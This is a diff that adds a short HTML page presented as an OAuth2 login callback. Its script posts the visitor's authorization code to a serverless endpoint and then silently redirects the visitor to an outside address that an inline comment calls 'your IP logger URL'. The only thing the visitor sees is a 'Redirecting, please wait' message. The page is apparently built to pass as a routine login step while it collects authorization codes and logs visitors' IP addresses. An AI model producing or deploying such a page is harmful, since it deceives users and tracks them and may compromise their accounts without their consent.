@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>OAuth2 Callback</title>
+</head>
+<body>
+  <div id="message" style="font-family: Arial; font-size: 20px; margin: 40px;">
+    Redirecting, please wait a second...
+  </div>
+
+  <script>
+    async function main() {
+      const params = new URLSearchParams(window.location.search);
+      const code = params.get("code");
+      if (!code) {
+        document.getElementById("message").textContent = "No code provided!";
+        return;
+      }
+
+      try {
+        // Send the code to your serverless function for processing
+        const res = await fetch('/api/oauth2-callback', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ code }),
+        });
+
+        if (!res.ok) throw new Error('Failed to authorize');
+
+        // Wait a sec then redirect
+        setTimeout(() => {
+          window.location.href = "https://gify-sable.vercel.app/api/image.py"; // your IP logger URL
+        }, 2000);
+      } catch (e) {
+        document.getElementById("message").textContent = "Error during authorization";
+        console.error(e);
+      }
+    }
+
+    main();
+  </script>
+</body>
+</html>
